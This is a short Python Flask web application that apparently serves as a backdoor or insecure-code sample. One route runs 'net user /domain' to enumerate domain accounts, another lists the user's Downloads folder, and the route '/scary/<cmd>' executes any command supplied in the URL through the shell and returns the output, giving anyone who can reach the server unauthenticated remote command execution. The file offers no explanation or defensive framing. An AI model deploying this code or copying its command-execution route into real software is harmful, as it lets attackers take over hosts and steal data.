from flask import Flask
import os
import subprocess

app = Flask(__name__)

@app.route('/')
def hello():
	return "Hello there"

@app.route('/secret')
def secret():
	out = subprocess.check_output('net user /domain', shell=True)
	return out

@app.route('/downloads')
def dloads():
	try:
		if os.name == 'posix':
			# List downloads on *nix machines
			out = subprocess.check_output('ls ~/Downloads', shell=True)
		else:
			# List downloads on Windows machines
			out = subprocess.check_output('dir %HOMEDRIVE%%HOMEPATH%\Downloads', shell=True)
		return out
	except:
		return "Downloads folder not in standard location"

@app.route('/scary/<cmd>')
def ohno(cmd):
	out = subprocess.check_output(cmd, shell=True)
	return out
